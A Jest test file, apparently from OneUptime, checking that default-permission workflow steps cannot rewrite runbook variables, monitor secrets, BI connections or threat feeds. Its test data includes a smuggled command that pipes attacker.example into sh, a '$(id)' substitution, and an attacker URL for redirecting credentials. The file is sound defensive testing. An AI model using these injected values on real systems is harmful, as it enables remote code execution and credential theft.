import AllModelTypes from "../../../../../Models/DatabaseModels/Index";
import BaseModel from "../../../../../Models/DatabaseModels/DatabaseBaseModel/DatabaseBaseModel";
import DataBiConnection from "../../../../../Models/DatabaseModels/DataBiConnection";
import Label from "../../../../../Models/DatabaseModels/Label";
import Monitor from "../../../../../Models/DatabaseModels/Monitor";
import MonitorSecret from "../../../../../Models/DatabaseModels/MonitorSecret";
import RunbookVariable from "../../../../../Models/DatabaseModels/RunbookVariable";
import TeamPermission from "../../../../../Models/DatabaseModels/TeamPermission";
import ThreatIntelFeed from "../../../../../Models/DatabaseModels/ThreatIntelFeed";
import DataBiConnectionService from "../../../../../Server/Services/DataBiConnectionService";
import DatabaseService from "../../../../../Server/Services/DatabaseService";
import MonitorSecretService from "../../../../../Server/Services/MonitorSecretService";
import ProjectService from "../../../../../Server/Services/ProjectService";
import RunbookVariableService from "../../../../../Server/Services/RunbookVariableService";
import ThreatIntelFeedService from "../../../../../Server/Services/ThreatIntelFeedService";
import DatabaseRequestType from "../../../../../Server/Types/BaseDatabase/DatabaseRequestType";
import ModelPermission from "../../../../../Server/Types/Database/Permissions/Index";
import TablePermission from "../../../../../Server/Types/Database/Permissions/TablePermission";
import WorkflowAccessChangeRefusedException from "../../../../../Server/Types/Database/Permissions/WorkflowAccessChangeRefusedException";
import WorkflowSecretChangeRefusedException from "../../../../../Server/Types/Database/Permissions/WorkflowSecretChangeRefusedException";
import ComponentCode, {
  RunOptions,
  RunReturnType,
} from "../../../../../Server/Types/Workflow/ComponentCode";
import CreateOneBaseModel from "../../../../../Server/Types/Workflow/Components/BaseModel/CreateOneBaseModel";
import DeleteOneBaseModel from "../../../../../Server/Types/Workflow/Components/BaseModel/DeleteOneBaseModel";
import FindManyBaseModel from "../../../../../Server/Types/Workflow/Components/BaseModel/FindManyBaseModel";
import FindOneBaseModel from "../../../../../Server/Types/Workflow/Components/BaseModel/FindOneBaseModel";
import {
  describeRefusal,
  describeStepCeiling,
} from "../../../../../Server/Types/Workflow/Components/BaseModel/LogComponentError";
import UpdateManyBaseModel from "../../../../../Server/Types/Workflow/Components/BaseModel/UpdateManyBaseModel";
import UpdateOneBaseModel from "../../../../../Server/Types/Workflow/Components/BaseModel/UpdateOneBaseModel";
import RuntimeComponents from "../../../../../Server/Types/Workflow/Components/Index";
import ProjectReferenceCheck from "../../../../../Server/Utils/Database/ProjectReferenceCheck";
import WorkflowPrincipal, {
  WorkflowRunAsGrant,
} from "../../../../../Server/Utils/Workflow/WorkflowPrincipal";
import DatabaseCommonInteractionProps from "../../../../../Types/BaseDatabase/DatabaseCommonInteractionProps";
import ColumnAccessControl from "../../../../../Types/Database/AccessControl/ColumnAccessControl";
import PermissionScope from "../../../../../Types/Database/AccessControl/PermissionScope";
import { PlanType } from "../../../../../Types/Billing/SubscriptionPlan";
import Exception from "../../../../../Types/Exception/Exception";
import NotAuthorizedException from "../../../../../Types/Exception/NotAuthorizedException";
import { JSONObject } from "../../../../../Types/JSON";
import MonitorSecretAccess from "../../../../../Types/Monitor/MonitorSecretAccess";
import ObjectID from "../../../../../Types/ObjectID";
import Permission, {
  PermissionHelper,
  UserPermission,
} from "../../../../../Types/Permission";
import UserType from "../../../../../Types/UserType";
import {
  DatabaseOperation,
  WRITE_DATABASE_OPERATIONS,
  getDatabaseOperation,
} from "../../../../../Types/Workflow/DatabaseOperation";
import { WorkflowRunAs } from "../../../../../Types/Workflow/WorkflowRunAs";
import { setTestBillingEnabled } from "../../../Enterprise/TestBillingFlag";
import {
  InMemoryTable,
  StoredRow,
  useInMemoryTable,
} from "../../../TestingUtils/InMemoryRepository";
import { ON_HIGHEST_PLAN } from "../../../TestingUtils/RequestPlan";
import { getJestSpyOn } from "../../../../Spy";
import {
  afterAll,
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  jest,
  test,
} from "@jest/globals";

jest.mock("../../../../../Server/Utils/Logger");

jest.mock("../../../../../Server/EnvironmentConfig", () => {
  const billingFlag: typeof import("../../../Enterprise/TestBillingFlag") =
    jest.requireActual(
      "../../../Enterprise/TestBillingFlag",
    ) as typeof import("../../../Enterprise/TestBillingFlag");

  return billingFlag.withLiveBillingFlag(
    jest.requireActual("../../../../../Server/EnvironmentConfig") as Record<
      string,
      unknown
    >,
  );
});

/*
 * A WORKFLOW'S STEP CHANGES NONE OF THE PROJECT'S SECRETS, WHERE ONEUPTIME
 * SENDS THEM, OR WHAT ITS RUNBOOKS RUN - unless a person gave the workflow
 * the permissions to.
 *
 * A step of a workflow that runs with the default permissions acts as a
 * Project Admin of its project (WorkflowPrincipal), and a Project Admin may
 * change runbook variables, monitor secrets, BI tool connections and threat
 * intel feeds. But a Project Member builds workflows too, and may change
 * none of these: a member runs runbooks without changing them or reading
 * their variables. Through a workflow they could:
 *
 *   - rewrite a plain runbook variable - a host, a namespace - into a
 *     command. Its value is filled into an admin's Bash, SSH or kubectl
 *     script as it is written, so the next run of that runbook runs it on
 *     the project's own machines;
 *   - replace a secret variable's value, or have its secret handed to
 *     another of the project's Runners, or to global Runners;
 *   - widen a monitor secret to every monitor - their own among them - so a
 *     monitor they write sends the secret wherever they like;
 *   - point a BI tool connection or a threat intel feed at a server of
 *     theirs: OneUptime signs in to it with the credentials it holds.
 *
 * So a step of such a workflow is not lent that (SECRET_TABLES): it is
 * refused before anything else is asked or any hook runs, takes its Error
 * output, and its run log says so in plain words, with the permission the
 * change takes and where to give the workflow one. Its triggers and Find
 * steps still read these records. One that a person gave Project Owner or
 * a custom role to run as meets the checks a person meets instead: whoever
 * may change it holds those permissions (Types/Workflow/WorkflowRunAs).
 * People, API keys and OneUptime itself are held as before.
 *
 * The ways in run first, over the real services with the records held in
 * memory: on code without the rule, every one of these writes reaches the
 * table. Then every write step the Builder offers for these records; then
 * what still works; then the rule, the tables it reads, and the run log.
 */

const PLAN_ENVIRONMENT: Record<string, string> = {
  SUBSCRIPTION_PLAN_BASIC: "Free,price_free_month,price_free_year,0,0,1,0",
  SUBSCRIPTION_PLAN_GROWTH:
    "Growth,price_growth_month,price_growth_year,22,20,2,14",
  SUBSCRIPTION_PLAN_SCALE:
    "Scale,price_scale_month,price_scale_year,99,84,3,14",
  SUBSCRIPTION_PLAN_ENTERPRISE:
    "Enterprise,price_enterprise_month,price_enterprise_year,-1,-1,4,14",
};

const PROJECT_ID: ObjectID = new ObjectID(
  "7e000000-0000-4000-8000-000000000001",
);
const GIVER_ID: ObjectID = new ObjectID("7e000000-0000-4000-8000-0000000000a1");
// The project's runbook variables: a host a script names, and an SSH key.
const HOST_VARIABLE_ID: string = "7e000000-0000-4000-8000-0000000000b1";
const KEY_VARIABLE_ID: string = "7e000000-0000-4000-8000-0000000000b2";
// The Runner the key is for, and another of the project's Runners.
const DATABASE_RUNNER_ID: string = "7e000000-0000-4000-8000-0000000000c1";
const OTHER_RUNNER_ID: string = "7e000000-0000-4000-8000-0000000000c2";
// A monitor secret, the monitor it is for, and a monitor of the member's.
const MONITOR_SECRET_ID: string = "7e000000-0000-4000-8000-0000000000d1";
const CHECKOUT_MONITOR_ID: string = "7e000000-0000-4000-8000-0000000000d2";
const MEMBER_MONITOR_ID: string = "7e000000-0000-4000-8000-0000000000d3";
// A BI tool connection and a threat intel feed, each signing in somewhere.
const BI_CONNECTION_ID: string = "7e000000-0000-4000-8000-0000000000e1";
const THREAT_FEED_ID: string = "7e000000-0000-4000-8000-0000000000e2";

const HOST: string = "10.0.4.21";
const INJECTED: string = "10.0.4.21; curl -s https://attacker.example | sh";
const KEY: string = "-----BEGIN OPENSSH PRIVATE KEY-----";
const LOOKER: string = "https://looker.example.com";
const TAXII: string = "https://taxii.example.com/api1/";
const ATTACKER: string = "https://attacker.example.com";

/*
 * How a default step's refusal begins (WorkflowPrincipal
 * .getSecretChangeRefusal), and the words a refusal for anything else a
 * Project Admin may not do begins with, which this one never says.
 */
const SECRET_REFUSAL_START: string =
  "Workflows that run with the default permissions don't change the project's secrets, where OneUptime sends them, or what its runbooks run";
const ADMIN_CEILING: string =
  "Workflow steps can do only what a Project Admin of this project can do";

const SECRET_MODELS: Array<{ new (): BaseModel }> = [
  DataBiConnection,
  MonitorSecret,
  RunbookVariable,
  ThreatIntelFeed,
];

/*
 * What a default step's refusal to `verb` a record of `modelType` says,
 * worked out here from the model's own lists: the permissions the write
 * takes besides Project Owner and Project Admin, by their titles, which a
 * custom role the workflow runs as would need.
 */
function expectedRefusal(
  modelType: { new (): BaseModel },
  verb: "create" | "change" | "delete",
): string {
  const model: BaseModel = new modelType();

  const list: Array<Permission> =
    verb === "create"
      ? model.createRecordPermissions
      : verb === "delete"
        ? model.deleteRecordPermissions
        : model.updateRecordPermissions;

  const titles: Array<string> = PermissionHelper.getPermissionTitles(
    Array.from(new Set<Permission>(list)).filter(
      (permission: Permission): boolean => {
        return (
          permission !== Permission.ProjectOwner &&
          permission !== Permission.ProjectAdmin
        );
      },
    ),
  );

  return `${SECRET_REFUSAL_START}, so this step can't ${verb} ${model.pluralName!}. To let this workflow do it, choose what it runs as in its Settings: Project Owner, or a custom role that has ${titles.join(" or ")}.`;
}

interface StepRun {
  result: RunReturnType;
  lines: Array<string>;
}

type SpyInstance = ReturnType<typeof getJestSpyOn>;

const savedPlanEnvironment: Record<string, string | undefined> = {};

function row(permission: Permission): UserPermission {
  return {
    _type: "UserPermission",
    permission: permission,
    labelIds: [],
    scope: PermissionScope.All,
    isBlockPermission: false,
  };
}

const OWNER_RUN: WorkflowRunAsGrant = {
  runAs: WorkflowRunAs.ProjectOwner,
  givenByUserId: GIVER_ID,
  givenByName: "Jane Doe",
};

// A workflow that runs as the custom role "Secret Rotation", holding these.
function roleRun(permissions: Array<Permission>): WorkflowRunAsGrant {
  return {
    runAs: WorkflowRunAs.CustomRole,
    customRoleId: ObjectID.generate(),
    customRoleName: "Secret Rotation",
    rolePermissions: permissions.map(row),
    givenByUserId: GIVER_ID,
    givenByName: "Jane Doe",
  };
}

function options(
  lines: Array<string>,
  runAs?: WorkflowRunAsGrant | undefined,
): RunOptions {
  return {
    log: ((line: unknown): void => {
      lines.push(typeof line === "string" ? line : JSON.stringify(line));
    }) as RunOptions["log"],
    workflowLogId: ObjectID.generate(),
    workflowId: ObjectID.generate(),
    workflowName: "Member's automation",
    projectId: PROJECT_ID,
    runAs: runAs,
    onError: ((exception: Exception): Exception => {
      return exception;
    }) as RunOptions["onError"],
    executeWorkflow: async (): Promise<void> => {},
  };
}

async function run(
  component: ComponentCode,
  args: JSONObject,
  runAs?: WorkflowRunAsGrant | undefined,
): Promise<StepRun> {
  const lines: Array<string> = [];
  const result: RunReturnType = await component.run(
    args,
    options(lines, runAs),
  );
  return { result, lines };
}

// The run log's line for a step refused for changing a secret, checked whole.
function expectSecretRefusal(
  step: ComponentCode,
  stepRun: StepRun,
  verb: "create" | "change" | "delete",
  records: string,
): void {
  const modelType: { new (): BaseModel } = (
    step as unknown as { modelService: DatabaseService<BaseModel> }
  ).modelService.modelType as { new (): BaseModel };

  expect(new modelType().pluralName).toBe(records);

  const expected: string = `"${step.getMetadata().title}" was refused. ${expectedRefusal(modelType, verb)}`;

  expect(stepRun.result.executePort?.id).toBe("error");
  expect(stepRun.lines).toContain(expected);
  // The Steps view shows the same reason under the Error output.
  expect(stepRun.result.executePortReason).toBe(expected);
  // Said as it is: a Project Admin may make this change, a step may not.
  expect(stepRun.result.executePortReason).not.toContain(ADMIN_CEILING);
}

// A person of the project holding `permissions`, as the API hands them on.
function person(
  permissions: Array<Permission>,
  userType: UserType = UserType.User,
): DatabaseCommonInteractionProps {
  const props: DatabaseCommonInteractionProps = {
    tenantId: PROJECT_ID,
    userType: userType,
    ...ON_HIGHEST_PLAN,
    userGlobalAccessPermission: {
      _type: "UserGlobalAccessPermission",
      projectIds: [PROJECT_ID],
      globalPermissions: [Permission.Public, Permission.User],
    },
    userTenantAccessPermission: {
      [PROJECT_ID.toString()]: {
        _type: "UserTenantAccessPermission",
        projectId: PROJECT_ID,
        permissions: permissions.map(row),
      },
    },
  };

  if (userType === UserType.User) {
    props.userId = GIVER_ID;
  }

  return props;
}

// What a workflow's step acts with, on the highest plan.
function stepProps(
  runAs?: WorkflowRunAsGrant | undefined,
): DatabaseCommonInteractionProps {
  return {
    ...WorkflowPrincipal.getPropsWithoutPlan({
      projectId: PROJECT_ID,
      workflowId: ObjectID.generate(),
      workflowName: "Member's automation",
      runAs: runAs,
    }),
    ...ON_HIGHEST_PLAN,
  };
}

beforeAll(() => {
  for (const key of Object.keys(process.env)) {
    if (key.startsWith("SUBSCRIPTION_PLAN_")) {
      savedPlanEnvironment[key] = process.env[key];
      delete process.env[key];
    }
  }

  Object.assign(process.env, PLAN_ENVIRONMENT);
});

afterAll(() => {
  for (const key of Object.keys(PLAN_ENVIRONMENT)) {
    delete process.env[key];
  }

  for (const [key, value] of Object.entries(savedPlanEnvironment)) {
    if (value !== undefined) {
      process.env[key] = value;
    }
  }
});

beforeEach(() => {
  // As on OneUptime Cloud, on a plan that sells runbook variables.
  setTestBillingEnabled(true);

  getJestSpyOn(ProjectService, "getCurrentPlan").mockImplementation(
    (async () => {
      return { plan: PlanType.Enterprise, isSubscriptionUnpaid: false };
    }) as never,
  );

  /*
   * The cross-project reference check (that what a row names is this
   * project's) is a defence of its own, with its own tests; the rows here
   * are all this project's.
   */
  getJestSpyOn(ProjectReferenceCheck, "validateCreate").mockResolvedValue(
    undefined as never,
  );
});

afterEach(() => {
  jest.restoreAllMocks();
  setTestBillingEnabled(false);
});

/*
 * The project's secrets as their pages make them, held in memory behind
 * the real services: a host a runbook's script names and the SSH key it
 * signs in with, for the database Runner only; a payment provider's token
 * for the checkout monitor only; a Looker connection and a TAXII feed.
 */
interface Project {
  variables: InMemoryTable;
  monitorSecrets: InMemoryTable;
  biConnections: InMemoryTable;
  threatFeeds: InMemoryTable;
}

function project(): Project {
  const variables: InMemoryTable = useInMemoryTable(RunbookVariableService, [
    {
      _id: HOST_VARIABLE_ID,
      projectId: PROJECT_ID.toString(),
      name: "PROD_DB_HOST",
      isSecret: false,
      value: HOST,
      isAvailableToGlobalRunners: false,
    },
    {
      _id: KEY_VARIABLE_ID,
      projectId: PROJECT_ID.toString(),
      name: "PROD_DB_SSH_KEY",
      isSecret: true,
      secretValue: KEY,
      isAvailableToGlobalRunners: false,
      runners: [{ _id: DATABASE_RUNNER_ID }],
    },
  ]);

  const monitorSecrets: InMemoryTable = useInMemoryTable(MonitorSecretService, [
    {
      _id: MONITOR_SECRET_ID,
      projectId: PROJECT_ID.toString(),
      name: "PAYMENTS_TOKEN",
      secretValue: "sk_live_payments",
      monitorAccess: MonitorSecretAccess.SpecificMonitors,
      monitors: [{ _id: CHECKOUT_MONITOR_ID }],
    },
  ]);

  const biConnections: InMemoryTable = useInMemoryTable(
    DataBiConnectionService,
    [
      {
        _id: BI_CONNECTION_ID,
        projectId: PROJECT_ID.toString(),
        name: "Looker",
        tool: "Looker",
        baseUrl: LOOKER,
        credentials: '{"clientId":"looker","clientSecret":"s3cret"}',
      },
    ],
  );

  const threatFeeds: InMemoryTable = useInMemoryTable(ThreatIntelFeedService, [
    {
      _id: THREAT_FEED_ID,
      projectId: PROJECT_ID.toString(),
      name: "Partner TAXII",
      feedType: "Taxii",
      apiRootUrl: TAXII,
      collectionId: "indicators",
      apiToken: "taxii-token",
      cursor: "2026-11-01T00:00:00Z",
    },
  ]);

  return { variables, monitorSecrets, biConnections, threatFeeds };
}

// Every write a table was asked for: its updates, inserts, saves and deletes.
function writesTo(table: InMemoryTable): number {
  return (
    table.updates.length +
    table.inserts.length +
    table.deletes.length +
    table.repository.save.mock.calls.length
  );
}

describe("a project member's workflow cannot change what a runbook runs", () => {
  test('"Update One Runbook Variable" rewriting a host a script names into a command is refused, and the host stays', async () => {
    const world: Project = project();
    const component: UpdateOneBaseModel<RunbookVariable> =
      new UpdateOneBaseModel<RunbookVariable>(RunbookVariableService);

    const step: StepRun = await run(component, {
      query: { _id: HOST_VARIABLE_ID },
      data: { value: INJECTED },
    });

    expectSecretRefusal(component, step, "change", "Runbook Variables");

    expect(writesTo(world.variables)).toBe(0);
    expect(world.variables.get(HOST_VARIABLE_ID)?.["value"]).toBe(HOST);
  });

  test('"Create One Runbook Variable" adding a variable a runbook names is refused, and none is added', async () => {
    const world: Project = project();
    const component: CreateOneBaseModel<RunbookVariable> =
      new CreateOneBaseModel<RunbookVariable>(RunbookVariableService);

    const step: StepRun = await run(component, {
      json: { name: "DEPLOY_TARGET", isSecret: false, value: "$(id)" },
    });

    expectSecretRefusal(component, step, "create", "Runbook Variables");

    expect(writesTo(world.variables)).toBe(0);
    expect(world.variables.rows).toHaveLength(2);
  });

  test('"Update One Runbook Variable" replacing an SSH key is refused, and the key stays', async () => {
    const world: Project = project();
    const component: UpdateOneBaseModel<RunbookVariable> =
      new UpdateOneBaseModel<RunbookVariable>(RunbookVariableService);

    const step: StepRun = await run(component, {
      query: { _id: KEY_VARIABLE_ID },
      data: { secretValue: "-----BEGIN OPENSSH PRIVATE KEY----- attacker" },
    });

    expectSecretRefusal(component, step, "change", "Runbook Variables");

    expect(writesTo(world.variables)).toBe(0);
    expect(world.variables.get(KEY_VARIABLE_ID)?.["secretValue"]).toBe(KEY);
  });

  test('"Update One Runbook Variable" handing a secret to another Runner, or to global Runners, is refused, and it reaches only its own', async () => {
    const world: Project = project();
    const component: UpdateOneBaseModel<RunbookVariable> =
      new UpdateOneBaseModel<RunbookVariable>(RunbookVariableService);

    for (const data of [
      { runners: [{ _id: DATABASE_RUNNER_ID }, { _id: OTHER_RUNNER_ID }] },
      { runners: [OTHER_RUNNER_ID] },
      { isAvailableToGlobalRunners: true },
    ] as Array<JSONObject>) {
      const step: StepRun = await run(component, {
        query: { _id: KEY_VARIABLE_ID },
        data: data,
      });

      expectSecretRefusal(component, step, "change", "Runbook Variables");
    }

    expect(writesTo(world.variables)).toBe(0);
    expect(world.variables.get(KEY_VARIABLE_ID)?.["runners"]).toEqual([
      { _id: DATABASE_RUNNER_ID },
    ]);
    expect(
      world.variables.get(KEY_VARIABLE_ID)?.["isAvailableToGlobalRunners"],
    ).toBe(false);
  });

  test('"Update Many Runbook Variables" over every variable is refused, and none changes', async () => {
    const world: Project = project();
    const component: UpdateManyBaseModel<RunbookVariable> =
      new UpdateManyBaseModel<RunbookVariable>(RunbookVariableService);

    const step: StepRun = await run(component, {
      query: {},
      data: { description: "Rotated by a workflow" },
    });

    expectSecretRefusal(component, step, "change", "Runbook Variables");
    expect(writesTo(world.variables)).toBe(0);
  });

  test('"Delete One Runbook Variable" is refused, and the variable stays', async () => {
    const world: Project = project();
    const component: DeleteOneBaseModel<RunbookVariable> =
      new DeleteOneBaseModel<RunbookVariable>(RunbookVariableService);

    const step: StepRun = await run(component, {
      query: { _id: KEY_VARIABLE_ID },
    });

    expectSecretRefusal(component, step, "delete", "Runbook Variables");
    expect(world.variables.deletes).toEqual([]);
    expect(world.variables.get(KEY_VARIABLE_ID)).toBeDefined();
  });
});

describe("a project member's workflow cannot send a credential somewhere new", () => {
  test('"Update One Monitor Secret" widening a secret to every monitor is refused, and it stays with its own', async () => {
    const world: Project = project();
    const component: UpdateOneBaseModel<MonitorSecret> =
      new UpdateOneBaseModel<MonitorSecret>(MonitorSecretService);

    const step: StepRun = await run(component, {
      query: { _id: MONITOR_SECRET_ID },
      data: { monitorAccess: MonitorSecretAccess.AllMonitors },
    });

    expectSecretRefusal(component, step, "change", "Monitor Secrets");

    expect(writesTo(world.monitorSecrets)).toBe(0);
    expect(world.monitorSecrets.get(MONITOR_SECRET_ID)?.["monitorAccess"]).toBe(
      MonitorSecretAccess.SpecificMonitors,
    );
  });

  test('"Update One Monitor Secret" giving a secret to a monitor of the member\'s is refused, and it stays with its own', async () => {
    const world: Project = project();
    const component: UpdateOneBaseModel<MonitorSecret> =
      new UpdateOneBaseModel<MonitorSecret>(MonitorSecretService);

    const step: StepRun = await run(component, {
      query: { _id: MONITOR_SECRET_ID },
      data: {
        monitors: [{ _id: CHECKOUT_MONITOR_ID }, { _id: MEMBER_MONITOR_ID }],
      },
    });

    expectSecretRefusal(component, step, "change", "Monitor Secrets");

    expect(writesTo(world.monitorSecrets)).toBe(0);
    expect(world.monitorSecrets.get(MONITOR_SECRET_ID)?.["monitors"]).toEqual([
      { _id: CHECKOUT_MONITOR_ID },
    ]);
  });

  test('"Update One BI Tool" pointing a connection at another server is refused, and it signs in where it did', async () => {
    const world: Project = project();
    const component: UpdateOneBaseModel<DataBiConnection> =
      new UpdateOneBaseModel<DataBiConnection>(DataBiConnectionService);

    const step: StepRun = await run(component, {
      query: { _id: BI_CONNECTION_ID },
      data: { baseUrl: ATTACKER },
    });

    expectSecretRefusal(component, step, "change", "BI Tools");

    expect(writesTo(world.biConnections)).toBe(0);
    expect(world.biConnections.get(BI_CONNECTION_ID)?.["baseUrl"]).toBe(LOOKER);
  });

  test('"Update One Threat Intel Feed" pointing a feed at another server is refused, and it polls where it did', async () => {
    const world: Project = project();
    const component: UpdateOneBaseModel<ThreatIntelFeed> =
      new UpdateOneBaseModel<ThreatIntelFeed>(ThreatIntelFeedService);

    const step: StepRun = await run(component, {
      query: { _id: THREAT_FEED_ID },
      data: { apiRootUrl: `${ATTACKER}/api1/` },
    });

    expectSecretRefusal(component, step, "change", "Threat Intel Feeds");

    expect(writesTo(world.threatFeeds)).toBe(0);
    expect(world.threatFeeds.get(THREAT_FEED_ID)?.["apiRootUrl"]).toBe(TAXII);
    // Nothing of the feed was touched: where it was polling up to stays.
    expect(world.threatFeeds.get(THREAT_FEED_ID)?.["cursor"]).toBe(
      "2026-11-01T00:00:00Z",
    );
  });
});

/*
 * Every write step the Builder offers for a record that holds the
 * project's secrets: Create, Update and Delete, One and Many, of each such
 * model - the components a workflow runs, as the server registers them. A
 * refused step reaches neither the table nor a hook.
 */
interface WriteStep {
  componentId: string;
  modelName: string;
  operation: DatabaseOperation;
  component: ComponentCode;
}

function secretWriteSteps(): Array<WriteStep> {
  const steps: Array<WriteStep> = [];

  for (const modelType of AllModelTypes as Array<{ new (): BaseModel }>) {
    const model: BaseModel = new modelType();

    if (
      !model.enableWorkflowOn ||
      !WorkflowPrincipal.isSecretTable(modelType)
    ) {
      continue;
    }

    for (const [componentId, component] of Object.entries(RuntimeComponents)) {
      const operation: DatabaseOperation | null = getDatabaseOperation({
        componentId: componentId,
        tableName: model.tableName!,
      });

      if (operation && WRITE_DATABASE_OPERATIONS.includes(operation)) {
        steps.push({
          componentId,
          modelName: model.tableName!,
          operation,
          component,
        });
      }
    }
  }

  return steps.sort((a: WriteStep, b: WriteStep): number => {
    return a.componentId.localeCompare(b.componentId);
  });
}

const SECRET_WRITE_STEPS: Array<WriteStep> = secretWriteSteps();

// What each kind of write step is handed: enough to reach the service.
function argumentsFor(operation: DatabaseOperation): JSONObject {
  switch (operation) {
    case DatabaseOperation.CreateOne:
      return { json: { name: "ROTATED" } };
    case DatabaseOperation.CreateMany:
      return { "json-array": [{ name: "ROTATED" }] };
    case DatabaseOperation.UpdateOne:
    case DatabaseOperation.UpdateMany:
      return { query: { _id: HOST_VARIABLE_ID }, data: { name: "ROTATED" } };
    case DatabaseOperation.DeleteOne:
    case DatabaseOperation.DeleteMany:
      return { query: { _id: HOST_VARIABLE_ID } };
    default:
      throw new Error(`Not a write step: ${operation}`);
  }
}

function verbFor(operation: DatabaseOperation): "create" | "change" | "delete" {
  if (
    operation === DatabaseOperation.CreateOne ||
    operation === DatabaseOperation.CreateMany
  ) {
    return "create";
  }

  if (
    operation === DatabaseOperation.DeleteOne ||
    operation === DatabaseOperation.DeleteMany
  ) {
    return "delete";
  }

  return "change";
}

describe("every step that would write a record holding the project's secrets", () => {
  test("is offered for each of them: Create, Update and Delete, One and Many", () => {
    const byModel: Record<string, Array<string>> = {};

    for (const step of SECRET_WRITE_STEPS) {
      (byModel[step.modelName] ||= []).push(step.operation);
    }

    for (const operations of Object.values(byModel)) {
      operations.sort();
    }

    const all: Array<string> = [...WRITE_DATABASE_OPERATIONS].sort();

    expect(byModel).toEqual({
      DataBiConnection: all,
      MonitorSecret: all,
      RunbookVariable: all,
      ThreatIntelFeed: all,
    });
  });

  test.each(
    SECRET_WRITE_STEPS.map((step: WriteStep) => {
      return [step.componentId, step] as [string, WriteStep];
    }),
  )(
    "%s is refused before its table or any hook is reached",
    async (_componentId: string, step: WriteStep) => {
      const service: DatabaseService<BaseModel> = (
        step.component as unknown as {
          modelService: DatabaseService<BaseModel>;
        }
      ).modelService;

      expect(service).toBeInstanceOf(DatabaseService);

      // Nothing past the refusal may run: not the table, not a hook.
      const repository: SpyInstance = getJestSpyOn(
        service,
        "getRepository",
      ).mockImplementation((() => {
        throw new Error("The table was reached.");
      }) as never);
      const hooks: Array<SpyInstance> = [
        "onBeforeCreate",
        "onBeforeUpdate",
        "onBeforeDelete",
      ].map((hook: string): SpyInstance => {
        return getJestSpyOn(service, hook as never);
      });

      const result: StepRun = await run(
        step.component,
        argumentsFor(step.operation),
      );

      expectSecretRefusal(
        step.component,
        result,
        verbFor(step.operation),
        new (service.modelType as { new (): BaseModel })().pluralName!,
      );

      expect(repository).not.toHaveBeenCalled();

      for (const hook of hooks) {
        expect(hook).not.toHaveBeenCalled();
      }
    },
  );
});

describe("what a step still does with these records", () => {
  test('"Find One Runbook Variable" reads a plain variable, as before', async () => {
    project();

    const step: StepRun = await run(
      new FindOneBaseModel<RunbookVariable>(RunbookVariableService),
      {
        query: { _id: HOST_VARIABLE_ID },
        select: { _id: true, name: true, value: true },
      },
    );

    expect(step.result.executePort?.id).toBe("success");
    expect(JSON.stringify(step.result.returnValues)).toContain(HOST);
  });

  test('"Find Many Monitor Secrets" reads which secrets there are, as before', async () => {
    project();

    const step: StepRun = await run(
      new FindManyBaseModel<MonitorSecret>(MonitorSecretService),
      {
        query: {},
        select: { _id: true, name: true },
      },
    );

    expect(step.result.executePort?.id).toBe("success");
    expect(JSON.stringify(step.result.returnValues)).toContain(
      "PAYMENTS_TOKEN",
    );
  });

  test("a step that writes any other record a Project Admin may write is not held to this rule", () => {
    for (const modelType of [Label, Monitor]) {
      expect(() => {
        TablePermission.checkTableLevelPermissions(
          modelType,
          stepProps(),
          DatabaseRequestType.Create,
        );
      }).not.toThrow();
    }
  });
});

/*
 * A workflow that runs as Project Owner or a custom role (#9695) runs with
 * the permissions of the person who gave them, and only people who hold
 * them may change it: its steps make these changes as far as those
 * permissions allow, as that person could.
 */
describe("a workflow that runs as more than the default still makes these changes", () => {
  test("as Project Owner: a step rotates a runbook variable, and the new value is stored", async () => {
    const world: Project = project();

    const step: StepRun = await run(
      new UpdateOneBaseModel<RunbookVariable>(RunbookVariableService),
      {
        query: { _id: HOST_VARIABLE_ID },
        data: { value: "10.0.4.22" },
      },
      OWNER_RUN,
    );

    expect(step.result.executePort?.id).toBe("success");
    expect(world.variables.get(HOST_VARIABLE_ID)?.["value"]).toBe("10.0.4.22");
  });

  test("as Project Owner: a step gives a monitor secret to every monitor, and it is", async () => {
    const world: Project = project();

    const step: StepRun = await run(
      new UpdateOneBaseModel<MonitorSecret>(MonitorSecretService),
      {
        query: { _id: MONITOR_SECRET_ID },
        data: { monitorAccess: MonitorSecretAccess.AllMonitors },
      },
      OWNER_RUN,
    );

    expect(step.result.executePort?.id).toBe("success");
    expect(world.monitorSecrets.get(MONITOR_SECRET_ID)?.["monitorAccess"]).toBe(
      MonitorSecretAccess.AllMonitors,
    );
  });

  test("as Project Owner: a step moves a BI tool connection and a threat intel feed to their new servers", async () => {
    const world: Project = project();
    const newLooker: string = "https://looker.internal.example.com";
    const newTaxii: string = "https://taxii.internal.example.com/api1/";

    const bi: StepRun = await run(
      new UpdateOneBaseModel<DataBiConnection>(DataBiConnectionService),
      { query: { _id: BI_CONNECTION_ID }, data: { baseUrl: newLooker } },
      OWNER_RUN,
    );
    const feed: StepRun = await run(
      new UpdateOneBaseModel<ThreatIntelFeed>(ThreatIntelFeedService),
      { query: { _id: THREAT_FEED_ID }, data: { apiRootUrl: newTaxii } },
      OWNER_RUN,
    );

    expect(bi.result.executePort?.id).toBe("success");
    expect(feed.result.executePort?.id).toBe("success");
    expect(world.biConnections.get(BI_CONNECTION_ID)?.["baseUrl"]).toBe(
      newLooker,
    );
    expect(world.threatFeeds.get(THREAT_FEED_ID)?.["apiRootUrl"]).toBe(
      newTaxii,
    );
  });

  test("as a custom role that has Edit Runbook Variable: a step rotates a variable", async () => {
    const world: Project = project();

    const step: StepRun = await run(
      new UpdateOneBaseModel<RunbookVariable>(RunbookVariableService),
      {
        query: { _id: HOST_VARIABLE_ID },
        data: { value: "10.0.4.23" },
      },
      roleRun([Permission.EditRunbookSecret, Permission.ReadRunbookSecret]),
    );

    expect(step.result.executePort?.id).toBe("success");
    expect(world.variables.get(HOST_VARIABLE_ID)?.["value"]).toBe("10.0.4.23");
  });

  test("as a custom role that has Create Runbook Variable: a step adds a variable", async () => {
    const world: Project = project();

    const step: StepRun = await run(
      new CreateOneBaseModel<RunbookVariable>(RunbookVariableService),
      {
        json: { name: "DEPLOY_TARGET", isSecret: false, value: "10.0.4.30" },
      },
      roleRun([Permission.CreateRunbookSecret]),
    );

    expect(step.result.executePort?.id).toBe("success");
    expect(world.variables.inserts).toHaveLength(1);
    expect(world.variables.inserts[0]?.["name"]).toBe("DEPLOY_TARGET");
    expect(world.variables.inserts[0]?.["value"]).toBe("10.0.4.30");
  });

  test("as a custom role that has neither: the step is refused by the role's own limits, not by this rule", async () => {
    const world: Project = project();
    const runAs: WorkflowRunAsGrant = roleRun([
      Permission.RunbookAdmin,
      Permission.ProjectMember,
    ]);

    const step: StepRun = await run(
